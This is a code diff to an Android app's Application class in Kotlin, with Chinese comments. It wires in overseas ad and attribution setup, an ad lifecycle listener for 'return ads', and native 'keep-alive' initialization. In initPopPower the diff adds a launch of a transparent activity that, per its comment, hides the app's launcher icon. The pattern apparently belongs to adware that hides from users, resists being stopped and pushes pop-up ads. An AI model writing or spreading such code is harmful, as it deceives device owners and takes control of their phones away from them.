@@ -4,10 +4,10 @@ import android.app.Application
 import android.content.Intent
 import android.os.Bundle
 import com.keep.up.all.NativeJniUtils
+import com.p.b.ad.runtime.AdLifecycleInstaller
 import com.p.b.base.APPContext
 import com.p.b.base.OverseaAppHost
 import com.p.b.base.OverseaAppInitializer
-import com.p.b.ad.runtime.AdLifecycleInstaller
 
 
 class TheApplication : Application(), OverseaAppHost {
@@ -20,18 +20,16 @@ class TheApplication : Application(), OverseaAppHost {
     }
 
     override fun onCreate() {
-        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
         super.onCreate()
         insApp = this
-        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
+        // 原生 Application 需要主动触发海外公共初始化。
         OverseaAppInitializer.init(this, this)
-        // 统一安装广告生命周期监听，内部带幂等保护
+        // 安装返回广告所需的 Activity 生命周期监听。
         AdLifecycleInstaller.install(this)
         // 保证白包有 context
         APPContext.setApplication(this)
     }
 
-    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
     override fun openLaunch(intent: Intent?) {
         intent?.let { openLaunchByOther(null, it) }
     }
@@ -47,11 +45,16 @@ class TheApplication : Application(), OverseaAppHost {
 
 
     override fun initPopPower() {
+        // 启动图标隐藏：禁用 SplashActivity 主入口，启用透明 MysteryAliasActivity
+        startActivity(Intent(this, MysteryActivity::class.java).apply {
+            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        })
     }
 
 
     override fun initKeepPower(app: Application) {
-        NativeJniUtils.virinit(insApp)
+        // attachBaseContext 阶段 insApp 尚未赋值，必须使用回调传入的 Application。
+        NativeJniUtils.virinit(app)
     }
 
 }
